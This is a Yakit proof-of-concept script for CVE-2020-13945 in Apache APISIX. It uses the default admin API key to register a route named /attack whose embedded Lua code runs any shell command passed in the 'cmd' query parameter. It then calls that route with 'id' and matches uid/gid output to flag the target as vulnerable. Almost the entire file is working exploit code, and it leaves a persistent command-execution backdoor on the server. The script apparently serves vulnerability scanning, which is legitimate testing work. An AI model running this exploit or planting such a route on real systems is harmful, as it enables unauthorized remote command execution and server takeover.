##server:apisix
##type:poc
##params:root_url
##name:CVE_2020_13945
##severity:high
##out_put:
##require:

yakit.AutoInitYakit()
loglevel("info")
handleCheck = func(addr){
    isTls = str.IsTLSServer(addr)

    packet1 = `POST /apisix/admin/routes HTTP/1.1
Host: {{params(target)}}
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
Content-Type: application/json
Content-Length: 406

{
    "uri": "/attack",
"script": "local _M = {} \n function _M.access(conf, ctx) \n local os = require('os')\n local args = assert(ngx.req.get_uri_args()) \n local f = assert(io.popen(args.cmd, 'r'))\n local s = assert(f:read('*a'))\n ngx.say(s)\n f:close()  \n end \nreturn _M",
    "upstream": {
        "type": "roundrobin",
        "nodes": {
            "example.com:80": 1
        }
    }
}`
    packet2 = `GET /attack?cmd=id HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0`
    rsp1,req1,_ = poc.HTTP(packet1, 
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    rsp2,req2,_ = poc.HTTP(packet2, 
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    //dump(rsp)
    if len(rsp2) > 0 {

        if re.Match(`((uid\=\d*)|(gid\=\d*)|(groups=\d*)|(a=\d*))`, rsp2){
            risk.NewRisk(
            target, risk.severity("high"), 
            risk.title(f"FOUND ${target} CVE-2020-13945"),
            risk.titleVerbose("Apache APISIX 默认密钥漏洞（CVE-2020-13945）"),
            risk.type("命令执行"), risk.typeVerbose("代码注入"),
            risk.request(string(req2)),
            risk.response(string(rsp2)),
            risk.description("" /*type: string*/),
            risk.solution("" /*type: string*/),
            risk.details({
                "payload":"cmd=id",
                "payload_success_flag":`((uid\=\d*)|(gid\=\d*)|(groups=\d*)|(a=\d*))`
            }),
            )
            // log.info(json.dumps({"addr":addr,"success":true}))
        }else{
            // log.info(json.dumps({"success":false}))
        }
    }
    return
}

target = cli.String("root_url",cli.setRequired(true))
cli.check()
ip, port, _ = str.ParseStringToHostPort(target)
addr = str.HostPort(ip, port)
handleCheck(addr)
